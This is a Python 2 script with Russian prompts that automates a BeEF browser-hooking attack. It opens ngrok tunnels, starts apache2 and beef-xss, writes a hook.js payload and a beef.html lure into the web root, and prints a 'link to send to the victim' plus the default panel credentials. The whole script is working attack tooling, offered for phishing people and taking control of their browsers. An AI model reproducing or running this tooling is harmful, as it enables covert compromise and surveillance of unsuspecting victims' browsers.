#!/usr/bin/python
#-*- coding: utf-8 -*-
#Developer by Bafomet
import random 
import string
import argparse
import os
import subprocess
# set color
WHSL = '\033[1;32m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
GNSL = '\033[1;34m'

Filename="hook.js"

os.system('clear')
def ngrok():
	return ("""	
{1}__________________________________________________________________________________________________________________________________{2}

       {1}Инструкции по запуску ngrok. {2}
             
       {2}Тебе нужны 2 ссылки, которые перенаправляются на LocalHost:80 and LocalHost:3000 {2}
       
{1}__________________________________________________________________________________________________________________________________{2}
       
       {1}Шаг первый :{2} Добавить эти строки в ngrok.yml [Location .ngrok2/ngrok.yml ] {2}
        
	{0}
        	tunnels:
          	first-app:
            	addr: 80
            	proto: http
          	second-app:
            	addr: 3000
            	proto: http {0}

       {1}Шаг второй.{1}{2} Запусти ngrok. ./ngrok start --all, без рута{2}
       
{1}__________________________________________________________________________________________________________________________________{2}
       
       {1}Шаг третий.{1}{2} Beef listens on Port 3000 , поэтому эту ссылку следует перенаправить на LocalHost:3000{2}
       
{1}__________________________________________________________________________________________________________________________________{2}


       {2}Шаг четвертый : Ты увидишь 2 разные ссылки, перенаправленные на{2}
{0}
        Localhost:80                [ Ссылка для отправки жертве ]
        Localhost:3000		    [ Ваша ссылка будет подключаться к.. ]  {0}	
						

""").format(GNSL, REDL, WHSL)

def color(string, color=None):
    attr = []
    attr.append('1')
    
    if color:
        if color.lower() == "red":
            attr.append('31')
        elif color.lower() == "green":
            attr.append('32')
        elif color.lower() == "blue":
            attr.append('34')
        return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)

    else:
        if string.strip().startswith("[!]"):
            attr.append('31')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[+]"):
            attr.append('32')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[?]"):
            attr.append('33')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        elif string.strip().startswith("[*]"):
            attr.append('34')
            return '\x1b[%sm%s\x1b[0m' % (';'.join(attr), string)
        else:
            return string
def string_replace(filename, old_string, new_string):
    # Safely read the input filename using 'with'
    with open(filename) as f:
        s = f.read()
        if old_string not in s:
            print '"{old_string}" not found in {filename}.'.format(**locals())
            return

    # Safely write the changed content, if found in the file
    with open(filename, 'w') as f:
        #print 'Changing "{old_string}" to "{new_string}" in {filename}'.format(**locals())
        s = s.replace(old_string, new_string)
        f.write(s)
	print color('[ ✔ ] File Changed...','green')

if __name__ == '__main__':

	print("")
	os.system("python3 dll.py")
	print color(REDL + " [ + ] " + WHSL+ " Вводишь 1 он запустить beff с ngrok, введешь 0, запустит в локальной сети. \n")
	ng_check=raw_input(color(REDL + " [ + ] " + WHSL+ " Введите варианты загрузки : "))
	print ng_check
	if (ng_check):
		print color(ngrok(),"green")
		con=raw_input(color(REDL + " [ + ] " + WHSL+ " Нажми Enter ..."))	
	print color(" Требуется проверка статуса услуг ","blue")
	os.system("service apache2 start")
	os.system("sudo beef-xss")
	os.system("clear")
	subprocess.call("sudo python3 dll.py", shell=True)
	send_to=raw_input(color((' [ + ] Введите адрес ссылки [вы отправляете жертве]: ')))
	print("")
	send_to=send_to.rstrip()
	print color((" [ + ] Send_To Link  : "+ send_to))
	print("")
	connect_to=raw_input(color((' [ + ] Введите адрес ссылки [Ваша ссылка будет подключаться к.]: ')))
	print("")
	connect_to=connect_to.rstrip()
	print color((" [ + ] Connect_To Link  : "+ connect_to))
	print("")
	print color(' [ ✔ ] Проверка directories...','green')
	print("")
	if not os.path.isdir("./temp"):
		os.makedirs("./temp")
		print (color(" [ + ] Creating [./temp] directory for resulting code files","green"))
	else:
		os.system("rm -rf temp/*")
		print color("Clean Succesful","green")
	connect_to_full='http://'+connect_to+":80/hook.js"
	connect_to_panel='http://'+connect_to+"/ui/panel"
	send_to_full='http://'+send_to+'/beef.html'
	#print connect_to_full
	os.system("cp base.js ./temp/hook.js")
	string_replace("./temp/hook.js","SKS_1",connect_to_full)
	string_replace("./temp/hook.js","SKS_2",connect_to)
	
	os.system("cp beef.html ./temp/beef.html")
	string_replace("./temp/beef.html","SKS_3",send_to)
	os.system("cp ./temp/* /var/www/html/")
	os.system("chmod a+rw /var/www/html/hook.js")
	
	print color("\n==================================== RESULT ====================================\n","blue")
	print color(" [ + ] Доступ к панели управления BeeF с помощью : {}".format(connect_to_panel),"green")
	print("")
	print color("\t Username = beef\n\t Password = beef\n","blue")
	print color(" [ + ] Отправь жертве ссылку.  : "+send_to_full,"green")
